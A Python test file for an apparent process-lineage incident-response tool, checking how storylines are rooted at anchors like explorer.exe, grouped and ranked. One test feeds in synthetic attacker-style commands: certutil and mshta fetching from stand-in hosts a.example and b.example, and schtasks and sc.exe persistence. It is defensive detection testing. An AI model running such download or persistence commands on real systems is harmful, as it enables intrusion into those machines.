"""Storyline roots, membership (§9.2) and ranking (§9.3)."""

from pathlib import Path

from helpers.chain import EXPLORER, HOST, SYS32, Chain, guid
from lineage_ir.analyze.anchors import load_anchors
from lineage_ir.analyze.storyline import build_storylines
from lineage_ir.detect.engine import finding_id
from lineage_ir.engine import build_host_graphs, run_analysis
from lineage_ir.ingest.reader import read_inputs
from lineage_ir.models import Finding, IngestResult, Severity, SourceRef, Storyline

FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"


def make_finding(
    rule_id: str,
    tag: int | str,
    first_us: int,
    severity: Severity = "medium",
    tactics: tuple[str, ...] = ("execution",),
    host: str = HOST,
) -> Finding:
    node = tag if isinstance(tag, str) else guid(tag)
    # Evidence that resolves to no input record, so steps come from process creations only.
    source = SourceRef(file="crafted.jsonl", file_sha256="0" * 64, index=0, record_id=None)
    return Finding(
        finding_id=finding_id(rule_id, host, node),
        rule_id=rule_id,
        title=f"Rule {rule_id}",
        severity=severity,
        attack=(),
        tactics=tactics,
        why="test",
        host=host,
        guid=node,
        image_name=None,
        first_us=first_us,
        last_us=first_us,
        count=1,
        evidence=(source,),
        evidence_truncated=False,
        details={},
    )


def storylines(tmp_path: Path, chain: Chain, findings: list[Finding]) -> tuple[Storyline, ...]:
    ingest: IngestResult = read_inputs([chain.write(tmp_path / "in.jsonl")])
    graphs = build_host_graphs(ingest)
    return build_storylines(ingest, graphs, tuple(findings), load_anchors(), gap_seconds=600)


def test_root_is_the_last_node_before_the_first_anchor(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, "C:\\Tools\\a.exe", 1, 1).create(3, "C:\\Tools\\b.exe", 2, 2)
    (story,) = storylines(tmp_path, chain, [make_finding("TST-001", 3, 2)])
    assert story.root_guid == guid(2)
    assert story.anchor_image_name == "explorer.exe"
    assert story.root_image_name == "a.exe"
    assert story.path_nodes == (guid(2),)
    assert story.flagged == (guid(3),)


def test_root_is_the_topmost_ancestor_without_an_anchor(tmp_path: Path) -> None:
    chain = Chain().create(1, "C:\\Tools\\top.exe")
    chain.create(2, "C:\\Tools\\mid.exe", 1, 1).create(3, "C:\\Tools\\leaf.exe", 2, 2)
    (story,) = storylines(tmp_path, chain, [make_finding("TST-001", 3, 2)])
    assert story.root_guid == guid(1)
    assert story.anchor_image_name is None
    assert story.path_nodes == (guid(1), guid(2))


def test_a_flagged_anchor_is_its_own_root(tmp_path: Path) -> None:
    chain = Chain().create(1, SYS32 + "services.exe")
    chain.create(2, SYS32 + "wbem\\WmiPrvSE.exe", 1, 1)
    (story,) = storylines(tmp_path, chain, [make_finding("TST-001", 2, 1)])
    assert story.root_guid == guid(2)
    assert story.anchor_image_name is None
    assert story.path_nodes == ()


def test_ghost_root_and_ghost_anchor(tmp_path: Path) -> None:
    chain = Chain()
    # Ghost 9 (a bare "explorer.exe", so an anchor by name alone) above created 1.
    chain.create(1, "C:\\Tools\\a.exe", 9, 0, parent_image="explorer.exe")
    # Ghost 8 with no image above created 2: the ghost itself is the root.
    chain.create(2, "C:\\Tools\\b.exe", 8, 1)
    stories = storylines(
        tmp_path, chain, [make_finding("TST-001", 1, 0), make_finding("TST-002", 2, 1)]
    )
    by_root = {s.root_guid: s for s in stories}
    assert by_root[guid(1)].anchor_image_name == "explorer.exe"
    assert by_root[guid(8)].root_image_name is None
    assert by_root[guid(8)].path_nodes == (guid(8),)


def test_membership_and_preorder(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, "C:\\Tools\\root.exe", 1, 1)
    chain.create(3, "C:\\Tools\\left.exe", 2, 2)
    chain.create(4, "C:\\Tools\\left-child.exe", 3, 3)
    chain.create(5, "C:\\Tools\\right.exe", 2, 4)
    chain.create(6, "C:\\Tools\\right-child.exe", 5, 5)
    chain.create(7, "C:\\Tools\\right-grandchild.exe", 6, 6)
    chain.create(8, "C:\\Tools\\unrelated.exe", 2, 7)
    findings = [make_finding("TST-001", 3, 2), make_finding("TST-002", 6, 5)]
    (story,) = storylines(tmp_path, chain, findings)
    assert story.flagged == (guid(3), guid(6))
    assert story.path_nodes == (guid(2), guid(5))
    assert story.descendant_nodes == (guid(4), guid(7))
    assert story.nodes == tuple(guid(t) for t in (2, 3, 4, 5, 6, 7))
    assert story.finding_ids == tuple(f.finding_id for f in findings)


def test_storylines_never_merge_through_explorer_or_services(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(
        2, SYS32 + "cmd.exe", 1, 1, command="cmd.exe /c certutil -urlcache -f http://a.example/x"
    )
    chain.create(
        3, SYS32 + "certutil.exe", 2, 2, command="certutil -urlcache -f http://a.example/x"
    )
    chain.create(4, SYS32 + "mshta.exe", 1, 3, command="mshta.exe http://b.example/y.hta")
    chain.create(10, SYS32 + "services.exe", None, 4)
    chain.create(11, SYS32 + "schtasks.exe", 10, 5, command="schtasks /create /tn a /tr C:\\a.exe")
    chain.create(12, SYS32 + "sc.exe", 10, 6, command="sc.exe create b binPath= C:\\b.exe")
    result = run_analysis([chain.write(tmp_path / "in.jsonl")])
    roots = sorted(s.root_guid for s in result.storylines)
    assert roots == sorted(guid(t) for t in (2, 4, 11, 12))
    assert all(s.anchor_image_name in {"explorer.exe", "services.exe"} for s in result.storylines)


def test_masquerade_is_not_an_anchor() -> None:
    result = run_analysis([FIXTURES / "masquerade.jsonl"])
    graph = result.graphs[HOST]
    by_root = {graph.nodes[s.root_guid].image: s for s in result.storylines}
    fake = by_root["C:\\Users\\Public\\svchost.exe"]
    assert fake.anchor_image_name == "explorer.exe"
    assert [graph.nodes[g].image_name for g in fake.nodes] == [
        "svchost.exe",
        "cmd.exe",
        "certutil.exe",
    ]
    assert {f.rule_id for f in result.findings if f.guid == fake.root_guid} == {
        "LOC-001",
        "LOC-002",
    }
    real = by_root["C:\\Windows\\System32\\schtasks.exe"]
    assert real.anchor_image_name == "svchost.exe"
    assert real.nodes == (real.root_guid,)


def test_host_level_findings_form_one_storyline_per_host(tmp_path: Path) -> None:
    chain = Chain().create(1, "C:\\Tools\\a.exe")
    pseudo = f"host:{HOST}"
    findings = [make_finding("TST-001", pseudo, 0), make_finding("TST-002", pseudo, 5)]
    (story,) = storylines(tmp_path, chain, findings)
    assert story.root_guid == pseudo
    assert story.flagged == (pseudo,)
    assert story.nodes == (pseudo,)
    assert story.root_image_name is None and story.anchor_image_name is None
    assert len(story.finding_ids) == 2


def test_ranking_tie_breaks(tmp_path: Path) -> None:
    chain = Chain()
    for tag in range(1, 7):
        chain.create(tag, f"C:\\Tools\\p{tag}.exe", None, tag)
    # A storyline's start is its earliest step: node 7's creation comes before node 6's.
    chain.create(7, "C:\\Tools\\p7.exe", None, 0.5)
    findings = [
        # 1: severity decides (high first).
        make_finding("TST-001", 1, 10, "high"),
        # 2 and 3: same severity, more distinct tactics first.
        make_finding("TST-002", 2, 20, tactics=("execution", "persistence")),
        make_finding("TST-003", 3, 30, tactics=("execution",)),
        # 4 and 5: same severity and tactics, more findings first.
        make_finding("TST-004", 4, 40, "low"),
        make_finding("TST-005", 4, 41, "low"),
        make_finding("TST-006", 5, 45, "low"),
        # 6 and 7: equal so far, earlier start first.
        make_finding("TST-007", 7, 50, "info"),
        make_finding("TST-008", 6, 60, "info"),
    ]
    order = [s.root_guid for s in storylines(tmp_path, chain, findings)]
    assert order == [guid(t) for t in (1, 2, 3, 4, 5, 7, 6)]


def test_distinct_tactics_outrank_finding_count(tmp_path: Path) -> None:
    chain = Chain().create(1, "C:\\Tools\\a.exe", None, 1).create(2, "C:\\Tools\\b.exe", None, 0)
    findings = [
        make_finding("TST-001", 1, 10, tactics=("execution", "persistence")),
        make_finding("TST-002", 2, 20),
        make_finding("TST-003", 2, 21),
        make_finding("TST-004", 2, 22),
    ]
    order = [s.root_guid for s in storylines(tmp_path, chain, findings)]
    assert order == [guid(1), guid(2)]


def test_final_tie_break_is_host_then_root(tmp_path: Path) -> None:
    chain = Chain().create(2, "C:\\Tools\\b.exe").create(1, "C:\\Tools\\a.exe")
    chain.create(3, "C:\\Tools\\c.exe", host="ws-13.corp.example")
    findings = [
        make_finding("TST-001", 2, 0),
        make_finding("TST-002", 1, 0),
        make_finding("TST-003", 3, 0, host="ws-13.corp.example"),
    ]
    stories = storylines(tmp_path, chain, findings)
    assert [(s.host, s.root_guid) for s in stories] == [
        ("ws-13.corp.example", guid(3)),
        (HOST, guid(1)),
        (HOST, guid(2)),
    ]
    assert [s.storyline_id for s in stories] == ["S1", "S2", "S3"]
